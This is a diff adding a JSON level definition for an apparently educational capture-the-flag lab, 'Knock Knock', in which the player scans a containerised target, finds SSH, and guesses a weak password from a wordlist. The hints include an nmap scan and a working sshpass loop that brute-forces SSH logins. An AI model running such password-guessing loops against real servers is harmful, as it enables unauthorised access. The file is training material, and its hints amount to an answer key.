@@ -1,0 +1,26 @@
+{
+  "format_version": 1,
+  "id": "03-knock-knock",
+  "title": "Knock Knock",
+  "number": 3,
+  "summary": "A server sits on the lab network. Scan it, find the open door (SSH), and try passwords from a small wordlist.",
+  "story": "Across the lab network there is a server called 'target'. You cannot see inside it yet. First you knock on its doors to learn which services are open: that is what a port scan does. You will find SSH (the remote-login service) listening. The deploy account uses a weak password. With a small wordlist you can try them one by one until one opens the door. Watch the diagram: every knock (the TCP handshake) and every password guess shows up live.",
+  "objective": "Scan the target, find the SSH port, guess the deploy account's password from wordlist.txt, log in and read /home/deploy/flag.txt.",
+  "diagram": "network",
+  "hints": [
+    "Find open ports on the server: nmap target . Look for a line that says 22/tcp open ssh.",
+    "There is a wordlist in your home folder: cat wordlist.txt . The user to try is 'deploy'.",
+    "Try each password until one works. One line does it: for p in $(cat wordlist.txt); do sshpass -p \"$p\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 deploy@target 'cat flag.txt' && break; done"
+  ],
+  "containers": [
+    {"name": "player", "role": "player", "dockerfile": "Dockerfile.player"},
+    {"name": "target", "role": "target", "dockerfile": "Dockerfile.target"}
+  ],
+  "flag_placements": [
+    {"container": "target", "path": "/home/deploy/flag.txt", "mode": "600", "owner": "deploy"}
+  ],
+  "diagram_watch": {
+    "target": "target",
+    "port": 22
+  }
+}
